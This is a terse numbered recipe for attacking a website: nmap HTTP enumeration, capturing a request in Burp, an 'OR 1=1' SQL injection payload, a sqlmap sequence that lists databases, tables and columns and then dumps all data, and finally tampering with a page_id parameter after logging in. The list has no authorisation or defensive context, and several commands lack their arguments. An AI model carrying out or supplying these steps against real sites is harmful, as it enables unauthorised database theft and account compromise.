1. nmap -sV --script=http-enum [target domain or IP address]

2. Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap.

3. Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT” you get some value on burp copy that and create the txt file.(1 OR 1=1 #)

4. sqlmap -r --dbs

5. sqlmap -r -D --tables

6. sqlmap -r -D -T --columns

7. sqlmap -r -D -T --dump-all

8. then login and do the url parameter change page_id
